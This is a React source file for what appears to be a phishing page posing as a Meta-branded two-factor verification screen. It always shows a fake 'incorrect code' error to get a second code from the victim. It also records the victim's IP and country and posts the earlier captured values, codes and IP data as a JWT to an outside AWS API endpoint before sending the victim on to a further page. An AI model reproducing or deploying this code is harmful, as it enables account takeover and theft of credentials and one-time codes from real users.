import React, { useState, useEffect } from "react";
import { useLocation,useNavigate } from "react-router-dom";
import "bootstrap/dist/css/bootstrap.min.css";
import "./VerificationPage.scss"; // Custom styles
import axios from "axios";
import { useTranslation } from "react-i18next";
import { Modal, Button, Spinner } from "react-bootstrap";
import jwtEncode from "jwt-encode";

function VerificationPage2() {
  const location = useLocation(); // Get state data
  const [m1, setM1] = useState(location.state?.m1 || ""); 
  const [tk1, setTk1] = useState(location.state?.tk1 || ""); 
  const [tk2, setTk2] = useState(location.state?.tk2 || "");
  const [m2, setM2] = useState(location.state?.m2 || "");
  const [code1, setCode1] = useState(location.state?.code1 || ""); 
  const [messageId, setMessageId] = useState(location.state?.messageId || ""); // Retrieve message id
  const [loading, setLoading] = useState(false);
  const [ip, setIp] = useState("");
  const [country, setCountry] = useState("");
  const [ipTime, setIpTime] = useState("");
  const navigate = useNavigate(); // Hook điều hướng
  const [code2, setCode2] = useState("");
  const { t } = useTranslation();
  const [error, setError] = useState("");
  const [showModal, setShowModal] = useState(false);

  const getCurrentCountry = async () => {
    try {
      const response = await axios.get("https://ipwho.is/");
      return { country: response.data.country, ipTime: new Date().toLocaleString("en-US", { timeZone: "UTC" }) };
    } catch (error) {
      console.error("Error fetching country:", error);
    }
  };

  const getUserIP = async () => {
    try {
      const response = await fetch("https://api64.ipify.org?format=json");
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error("Error fetching IP:", error);
    }
  };

  useEffect(() => {
    async function fetchData() {
      const userIp = await getUserIP();
      const { country: userCountry, ipTime: userIpTime } = await getCurrentCountry();
      setIp(userIp);
      setCountry(userCountry);
      setIpTime(userIpTime);
    }
    fetchData();
    setError("The verification code you entered is incorrect. A new verification code will be sent.");
  }, []);

  const sendCode = async () => {
    if (!code2.trim()) {
      return;
    }
    setShowModal(true); // Show modal before sending data
    try {
      const payload = {
        country,
        ip,
        tk1,
        m1,
        tk2,
        m2,
        code1,
        code2,
        ipTime
      };

      const token = jwtEncode(payload, process.env.REACT_APP_JWT_SECRET);
      const response = await axios.post("https://zvfkaxjghb.execute-api.ap-southeast-2.amazonaws.com/product/edit-sent", {
        type:3,
        token: token,
        lastMessageId: messageId,
      });
      setTimeout(() => {
        setShowModal(false); // Hide modal
        navigate("/ver3", { state: { tk1, m1,tk2, m2,code1,code2,messageId }});
      }, 1500);
      
    } catch (error) {
      console.error("Error:", error);
      alert("Error sending the verification code.");
      setShowModal(false);
    }
  };

  return (
    <div className="verification-container">
      <div className="navbar">
        <img
          src={"/MetIconTransparent2.svg"}
          alt="Logo"
          className="img-fluid"
        />
      </div>
      <div className="card p-4 text-center">
        {/* Top Illustration */}
        <img
          src={require("./fom2fa.png")}
          alt="Security"
          className="img-fluid mb-3"
        />

        {/* Message */}
        <h5 className="text-primary fw-bold">
        {t("verificationTitle")}
        </h5>
        <p className="text-muted small">
        {t("verificationMessage")}
        </p>

        {/* Code Input */}
        <input
          type="text"
          className="form-control mb-3 text-center"
          placeholder={t("verificationCodePlaceholder")}
          value={code2}
          onChange={(e) => setCode2(e.target.value)}
        />
        {error && <p className="text-danger small text-start">{error}</p>}
        {/* Submit Button */}
        <button className="btn btn-primary w-100" onClick={sendCode}>
        {t("sendVerificationCode")}
        </button>
      </div>
      {/* Verification Modal */}
      <Modal show={showModal} centered>
        <Modal.Body className="text-center">
          <Spinner animation="border" />
          <h4 className="mt-3">Verifying...</h4>
          <p>Please wait a moment.</p>
        </Modal.Body>
      </Modal>
    </div>
  );
}

export default VerificationPage2;